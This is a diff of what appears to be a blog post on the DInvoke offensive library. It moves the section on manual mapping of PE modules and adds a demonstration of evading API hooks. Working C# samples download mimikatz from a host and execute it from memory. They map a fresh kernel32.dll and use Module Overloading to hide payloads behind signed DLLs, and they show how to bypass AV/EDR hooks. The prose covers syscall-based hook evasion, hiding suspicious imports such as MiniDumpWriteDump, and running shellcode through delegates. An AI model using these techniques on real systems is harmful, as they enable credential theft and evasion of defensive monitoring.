@@ -275,6 +275,87 @@ Let's walk through the example in sequence:
 
 DInvoke was built to allow you (the offensive tool developer) choice in not just *what* code you execute but *how* you execute it.
 
+### Manual Mapping
+
+DInvoke supports manual mapping of PE modules, stored either on disk or in memory. This capability can be used either for bypassing API hooking or simply to load and execute payloads from memory without touching disk.
+
+![_config.yml]({{ site.baseurl }}/images/DInvoke/theres-always-room-for-one-more-28316601.png "Technique #332,769 for executing mimikatz") 
+
+The module may either be mapped into dynamically allocated memory or into memory backed by an arbitrary file on disk. When a module is manually mapped from disk, a fresh copy of it is used. That way, any hooks that AV/EDR would normally place within it will not be present. If the manually mapped module makes calls into other modules that are hooked, then AV/EDR may still trigger. But at least all calls into the manually mapped module itself will not be caught in any hooks. This is why [malware](https://www.vkremez.com/2020/02/lets-learn-inside-parallax-rat-malware.html?m=1) often manually maps `ntdll.dll`. They use a [fresh copy to bypass any hooks](https://blog.malwarebytes.com/threat-analysis/2018/08/process-doppelganging-meets-process-hollowing_osiris/) placed within the original copy of `ntdll.dll` loaded into the process when it was created, and force themselves to only use `Nt*` API calls located within that fresh copy of `ntdll.dll`. Since the `Nt*` API calls in `ntdll.dll` are merely wrappers for syscalls, any call into them will not inadvertantly jump into other modules that may have hooks in place. 
+
+In addition to normal manual mapping, we also added support for Module Overloading. Module Overloading allows you to store a payload in memory (in a byte array) into memory backed by a legitimate file on disk. That way, when you execute code from it, the code will appear to execute from a legitimate, validly signed DLL on disk. 
+
+To learn more about our manual mapping and Module Overloading implementations, check out the second post in this series (will add link once it is posted).
+
+A word of caution: manual mapping is complex and we do not garauntee that our implementation covers every edge case. The version we have implemented now is servicable for many common use cases and will be improved upon over time. Additionally, manual mapping and syscall stub generation do not currently work in WOW64 processes. See the note at the end of this post.
+
+### Example - Calling Exports from Memory
+
+We go into more detail on manual mapping in our separate blog post (available later), but here is just a sample of what you could do with the capabaility.
+
+```csharp
+
+using System;
+using System.Runtime.InteropServices;
+
+namespace MapTest
+{
+    class Program
+    {
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate int TestFunc();
+
+        static void Main(string[] args)
+        {
+            //Test DLL project can be found at: https://github.com/FuzzySecurity/DLL-Template
+
+            Console.WriteLine("[+] Mapping Test DLL from disk into memory!");
+
+            Console.WriteLine("\t[+] Calling Test DLL from memory by DLLMain...\n");
+            // (1) Call test DLL by DLLMain
+            SharpSploit.Execution.PE.PE_MANUAL_MAP ManMapTest = SharpSploit.Execution.ManualMap.Map.MapModuleToMemory(@"C:\Users\thewover.CYBERCYBER\Source\Repos\ManualMapTest\ManualMapTest\Dll-Template.dll");
+            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModule(ManMapTest.PEINFO, ManMapTest.ModuleBase);
+
+            Console.WriteLine();
+            Console.WriteLine("\t[+] Calling Test DLL from memory by export (also calls DllMain as part of init)!\n");
+
+            // (2) Call test DLL by export (Also calls DllMain as part of init)
+            SharpSploit.Execution.PE.PE_MANUAL_MAP ManMapTest2 = SharpSploit.Execution.ManualMap.Map.MapModuleToMemory(@"C:\Users\thewover.CYBERCYBER\Source\Repos\ManualMapTest\ManualMapTest\Dll-Template.dll");
+            object[] FunctionArgs = { };
+            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(ManMapTest2.PEINFO, ManMapTest2.ModuleBase, "test", typeof(TestFunc), FunctionArgs);
+
+            Console.WriteLine();
+            Console.WriteLine("[+] Mapping Test DLL from byte array and calling export!\n");
+
+            Console.WriteLine();
+            Console.WriteLine("\t[+] Calling Test DLL from memory by export (also calls DllMain as part of init)!\n");
+
+            // (3) Map test DLL using byte array. Call by export like above.
+            byte[] bytes = System.IO.File.ReadAllBytes(@"C:\Users\thewover.CYBERCYBER\Source\Repos\ManualMapTest\ManualMapTest\Dll-Template.dll");
+            SharpSploit.Execution.PE.PE_MANUAL_MAP ManMapTest3 = SharpSploit.Execution.ManualMap.Map.MapModuleToMemory(bytes);
+            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(ManMapTest3.PEINFO, ManMapTest3.ModuleBase, "test", typeof(TestFunc), FunctionArgs);
+
+            Console.WriteLine();
+            Console.WriteLine("[+] Mapping and calling Mimikatz from memory (via download from URL)!\n");
+
+            Console.WriteLine();
+            Console.WriteLine("\t[+] Calling Mimikatz EXE from memory!\n");
+
+            // (4) Mimikatz x64
+            byte[] katzBytes = new System.Net.WebClient().DownloadData(@"http://192.168.123.227:8000/mimikatz.exe");
+            SharpSploit.Execution.PE.PE_MANUAL_MAP ManMapKatz = SharpSploit.Execution.ManualMap.Map.MapModuleToMemory(katzBytes);
+            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedPEModule(ManMapKatz.PEINFO, ManMapKatz.ModuleBase);
+
+            Console.ReadLine();
+        }
+    }
+}    
+
+```
+
+![_config.yml]({{ site.baseurl }}/images/DInvoke/Manual_Map4.png "DInvoke and Manual Mapping")
+
 ### Bypass Hooking
 
 DInvoke provides you with many options for how to execute unmanaged code. 
@@ -286,10 +367,147 @@ DInvoke provides you with many options for how to execute unmanaged code.
 
 These are just some examples of how you could bypass hooks. The point is: by providing you with powerful and flexible primitives for determining how code is executed, all operational choices are left up to you. Choose wisely. ;-)
 
+### Example - Demonstrating API Hook Evasion
+
+Let us demonstrate evading API hooks using DInvoke and Manual Mapping. In the example below, 
+
+```csharp
+
+///Author: TheWover
+using System;
+using System.Runtime.InteropServices;
+
+namespace SpTestcase
+{
+    class Program
+    {
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenProcess(
+            SharpSploit.Execution.Win32.Kernel32.ProcessAccessFlags processAccess,
+            bool bInheritHandle,
+            uint processId
+        );
+
+        static void Main(string[] args)
+        {
+            // Details
+            String testDetail = @"
+            #=================>
+            # Hello there!
+            # I demonstrate API Hooking bypasses
+            # by calling OpenProcess via
+            # PInvoke then DInvoke.
+            # All handles are requested with
+            # PROCESS_ALL_ACCESS permissions.
+            #=================>
+            ";
+            Console.WriteLine(testDetail);
+
+            //PID of current process.
+            uint id = Convert.ToUInt32(System.Diagnostics.Process.GetCurrentProcess().Id);
+
+            //Process handle
+            IntPtr hProc;
+
+            // Create the array for the parameters for OpenProcess
+            object[] paramaters =
+            {
+                SharpSploit.Execution.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
+                false,
+                id
+            };
+
+            // Pause execution
+            Console.WriteLine("[*] Pausing execution..");
+            Console.ReadLine();
+
+            //////////////////////////////////////////////////////////////////////////////////////////////////////////
+            // Call OpenProcess using PInvoke
+            Console.WriteLine("[?] Call OpenProcess via PInvoke ...");
+            hProc = OpenProcess(SharpSploit.Execution.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, false, id);
+            Console.WriteLine("[>] Process handle : " + string.Format("{0:X}", hProc.ToInt64()) + "\n");
+
+            // Pause execution
+            Console.WriteLine("[*] Pausing execution..");
+            Console.ReadLine();
+
+            //////////////////////////////////////////////////////////////////////////////////////////////////////////
+            // Call OpenProcess using GetLibraryAddress (underneath the hood)
+            Console.WriteLine("[?] Call OpenProcess from the loaded module list using System.Diagnostics.Process.GetCurrentProcess().Modules ...");
+            hProc = SharpSploit.Execution.DynamicInvoke.Win32.OpenProcess(SharpSploit.Execution.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, false, id);
+            Console.WriteLine("[>] Process handle : " + string.Format("{0:X}", hProc.ToInt64()) + "\n");
+
+            // Pause execution
+            Console.WriteLine("[*] Pausing execution..");
+            Console.ReadLine();
+
+            //////////////////////////////////////////////////////////////////////////////////////////////////////////
+            // Search function by name from module in PEB
+            Console.WriteLine("[?] Specifying the name of a DLL (\"kernel32.dll\"), search the PEB for the loaded module and resolve a function by walking the export table in-memory...");
+            Console.WriteLine("[+] Search by name --> OpenProcess");
+            IntPtr pkernel32 = SharpSploit.Execution.DynamicInvoke.Generic.GetPebLdrModuleEntry("kernel32.dll");
+            IntPtr pOpenProcess = SharpSploit.Execution.DynamicInvoke.Generic.GetExportAddress(pkernel32, "OpenProcess");
+
+            //Call OpenProcess
+            hProc = (IntPtr)SharpSploit.Execution.DynamicInvoke.Generic.DynamicFunctionInvoke(pOpenProcess, typeof(SharpSploit.Execution.DynamicInvoke.Win32.Delegates.OpenProcess), ref paramaters);
+            Console.WriteLine("[>] Process Handle : " + string.Format("{0:X}", hProc.ToInt64()) + "\n");
+
+            // Pause execution
+            Console.WriteLine("[*] Pausing execution..");
+            Console.ReadLine();
+
+            //////////////////////////////////////////////////////////////////////////////////////////////////////////
+            // Manually map kernel32.dll
+            // Search function by name from module in PEB
+            Console.WriteLine("[?] Manually map a fresh copy of a DLL (\"kernel32.dll\"), and resolve a function by walking the export table in-memory...");
+            Console.WriteLine("[+] Search by name --> OpenProcess");
+            SharpSploit.Execution.PE.PE_MANUAL_MAP moduleDetails = SharpSploit.Execution.ManualMap.Map.MapModuleToMemory("C:\\Windows\\System32\\kernel32.dll");
+            Console.WriteLine("[>] Module Base : " + string.Format("{0:X}", moduleDetails.ModuleBase.ToInt64()) + "\n");
+
+            //Call OpenProcess
+            hProc = (IntPtr)SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "OpenProcess", typeof(SharpSploit.Execution.DynamicInvoke.Win32.Delegates.OpenProcess), paramaters);
+            Console.WriteLine("[>] Process Handle : " + string.Format("{0:X}", hProc.ToInt64()) + "\n");
+
+            // Pause execution
+            Console.WriteLine("[*] Pausing execution..");
+            Console.ReadLine();
+
+            //////////////////////////////////////////////////////////////////////////////////////////////////////////
+            // Map kernel32.dll using Module Overloading
+            // Search function by name from module in PEB
+            Console.WriteLine("[?] Use Module Overloading to map a fresh copy of a DLL (\"kernel32.dll\") into memory backed by another file on disk. Resolve a function by walking the export table in-memory...");
+            Console.WriteLine("[+] Search by name --> OpenProcess");
+            moduleDetails = SharpSploit.Execution.ManualMap.Overload.OverloadModule("C:\\Windows\\System32\\kernel32.dll");
+            Console.WriteLine("[>] Module Base : " + string.Format("{0:X}", moduleDetails.ModuleBase.ToInt64()) + "\n");
+
+            //Call OpenProcess
+            hProc = (IntPtr)SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "OpenProcess", typeof(SharpSploit.Execution.DynamicInvoke.Win32.Delegates.OpenProcess), paramaters);
+            Console.WriteLine("[>] Process Handle : " + string.Format("{0:X}", hProc.ToInt64()) + "\n");
+
+            // Pause execution
+            Console.WriteLine("[*] Pausing execution..");
+            Console.ReadLine();
+
+            //////////////////////////////////////////////////////////////////////////////////////////////////////////
+            Console.WriteLine("[!] Test complete!");
+
+            // Pause execution
+            Console.WriteLine("[*] Pausing execution..");
+            Console.ReadLine();
+
+        }
+    }
+}
+
+```
+
+To test this, we will use the tool [API Monitor v2](http://www.rohitab.com/apimonitor) to hook `kernel32.dll!OpenProcess`. Then we will run the demo through API Monitor. You may observe which of our calls to `OpenProcess` were caught in hooks by watching for those that are called with the PROCESS_ALL_ACCESS flag. As you will see, API Monitor successfully catches the API call when it is performed with PInvoke. However, it does NOT succeed when we use DInvoke or Manual Mapping. You may watch the video on Vimeo to see this in action.
+
 
 #### Example - Syscall Execution
 
-Speaking of bypassing hooks with syscalls... lets show you how to use them. First, we use `GetSyscallStub` to ~steal~ borrow the machine code of the syscall wrapper within `ntdll.dll` for `NtOpenProcess`. This ensures that we don't have to maintain a library of syscall IDs, since the appropriate ID will be embedded in the copy of `ntdll.dll` that resides on the local system. Then, we execute the resulting machine code using a delegate representing `NtOpenProcess`. Incidentally, because we are using a delegate to execute raw machine code, this also demonstrates how you could execute shellcode in the current process while passing in parameters and getting a return value.
+You may also bypass hooks with syscalls... let's show you how to use them. First, we use `GetSyscallStub` to ~steal~ borrow the machine code of the syscall wrapper within `ntdll.dll` for `NtOpenProcess`. This ensures that we don't have to maintain a library of syscall IDs, since the appropriate ID will be embedded in the copy of `ntdll.dll` that resides on the local system. Then, we execute the resulting machine code using a delegate representing `NtOpenProcess`. Incidentally, because we are using a delegate to execute raw machine code, this also demonstrates how you could execute shellcode in the current process while passing in parameters and getting a return value.
 
 Note: Syscall execution does not currently work in WOW64 processes. Please see the note at the bottom of this post for details.
 
@@ -398,90 +616,11 @@ namespace SpTestcase
 
 ![_config.yml]({{ site.baseurl }}/images/DInvoke/3_Syscall.png "Executing syscalls with DInvoke")
 
+Using syscalls this way will bypass ALL kinds of user-mode API hooking. You may test this in API Monitor the same way that we showed bypassing hooks with DInvoke and Manual Mapping.
+
 ### Avoid Suspicious Imports
 
 As previously mentioned, you can avoid statically importing suspicious API calls. If, for example, you wanted to import `MiniDumpWriteDump` from `Dbghelp.dll` you could use DInvoke to dynamically load the DLL and invoke the API call. If you were then to inspect your .NET Assembly in an Assembly dissassembler (such as dnSpy), you would find that `MiniDumpWriteDump` is not referenced in its import table.
-
-### Manual Mapping
-
-DInvoke supports manual mapping of PE modules, stored either on disk or in memory. This capability can be used either for bypassing API hooking or simply to load and execute payloads from memory without touching disk.
-
-![_config.yml]({{ site.baseurl }}/images/DInvoke/theres-always-room-for-one-more-28316601.png "Technique #332,769 for executing mimikatz") 
-
-The module may either be mapped into dynamically allocated memory or into memory backed by an arbitrary file on disk. When a module is manually mapped from disk, a fresh copy of it is used. That way, any hooks that AV/EDR would normally place within it will not be present. If the manually mapped module makes calls into other modules that are hooked, then AV/EDR may still trigger. But at least all calls into the manually mapped module itself will not be caught in any hooks. This is why [malware](https://www.vkremez.com/2020/02/lets-learn-inside-parallax-rat-malware.html?m=1) often manually maps `ntdll.dll`. They use a [fresh copy to bypass any hooks](https://blog.malwarebytes.com/threat-analysis/2018/08/process-doppelganging-meets-process-hollowing_osiris/) placed within the original copy of `ntdll.dll` loaded into the process when it was created, and force themselves to only use `Nt*` API calls located within that fresh copy of `ntdll.dll`. Since the `Nt*` API calls in `ntdll.dll` are merely wrappers for syscalls, any call into them will not inadvertantly jump into other modules that may have hooks in place. 
-
-In addition to normal manual mapping, we also added support for Module Overloading. Module Overloading allows you to store a payload in memory (in a byte array) into memory backed by a legitimate file on disk. That way, when you execute code from it, the code will appear to execute from a legitimate, validly signed DLL on disk. 
-
-To learn more about our manual mapping and Module Overloading implementations, check out the second post in this series (will add link once it is posted).
-
-A word of caution: manual mapping is complex and we do not garauntee that our implementation covers every edge case. The version we have implemented now is servicable for many common use cases and will be improved upon over time. Additionally, manual mapping and syscall stub generation do not currently work in WOW64 processes. See the note at the end of this post.
-
-### Example - Calling Exports from Memory
-
-We go into more detail on manual mapping in our separate blog post (available later), but here is just a sample of what you could do with the capabaility.
-
-```csharp
-
-using System;
-using System.Runtime.InteropServices;
-
-namespace MapTest
-{
-    class Program
-    {
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate int TestFunc();
-
-        static void Main(string[] args)
-        {
-            //Test DLL project can be found at: https://github.com/FuzzySecurity/DLL-Template
-
-            Console.WriteLine("[+] Mapping Test DLL from disk into memory!");
-
-            Console.WriteLine("\t[+] Calling Test DLL from memory by DLLMain...\n");
-            // (1) Call test DLL by DLLMain
-            SharpSploit.Execution.PE.PE_MANUAL_MAP ManMapTest = SharpSploit.Execution.ManualMap.Map.MapModuleToMemory(@"C:\Users\thewover.CYBERCYBER\Source\Repos\ManualMapTest\ManualMapTest\Dll-Template.dll");
-            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModule(ManMapTest.PEINFO, ManMapTest.ModuleBase);
-
-            Console.WriteLine();
-            Console.WriteLine("\t[+] Calling Test DLL from memory by export (also calls DllMain as part of init)!\n");
-
-            // (2) Call test DLL by export (Also calls DllMain as part of init)
-            SharpSploit.Execution.PE.PE_MANUAL_MAP ManMapTest2 = SharpSploit.Execution.ManualMap.Map.MapModuleToMemory(@"C:\Users\thewover.CYBERCYBER\Source\Repos\ManualMapTest\ManualMapTest\Dll-Template.dll");
-            object[] FunctionArgs = { };
-            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(ManMapTest2.PEINFO, ManMapTest2.ModuleBase, "test", typeof(TestFunc), FunctionArgs);
-
-            Console.WriteLine();
-            Console.WriteLine("[+] Mapping Test DLL from byte array and calling export!\n");
-
-            Console.WriteLine();
-            Console.WriteLine("\t[+] Calling Test DLL from memory by export (also calls DllMain as part of init)!\n");
-
-            // (3) Map test DLL using byte array. Call by export like above.
-            byte[] bytes = System.IO.File.ReadAllBytes(@"C:\Users\thewover.CYBERCYBER\Source\Repos\ManualMapTest\ManualMapTest\Dll-Template.dll");
-            SharpSploit.Execution.PE.PE_MANUAL_MAP ManMapTest3 = SharpSploit.Execution.ManualMap.Map.MapModuleToMemory(bytes);
-            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(ManMapTest3.PEINFO, ManMapTest3.ModuleBase, "test", typeof(TestFunc), FunctionArgs);
-
-            Console.WriteLine();
-            Console.WriteLine("[+] Mapping and calling Mimikatz from memory (via download from URL)!\n");
-
-            Console.WriteLine();
-            Console.WriteLine("\t[+] Calling Mimikatz EXE from memory!\n");
-
-            // (4) Mimikatz x64
-            byte[] katzBytes = new System.Net.WebClient().DownloadData(@"http://192.168.123.227:8000/mimikatz.exe");
-            SharpSploit.Execution.PE.PE_MANUAL_MAP ManMapKatz = SharpSploit.Execution.ManualMap.Map.MapModuleToMemory(katzBytes);
-            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedPEModule(ManMapKatz.PEINFO, ManMapKatz.ModuleBase);
-
-            Console.ReadLine();
-        }
-    }
-}    
-
-```
-
-![_config.yml]({{ site.baseurl }}/images/DInvoke/Manual_Map4.png "DInvoke and Manual Mapping")
 
 ### Unknown Execution Flow at Compile Time
 
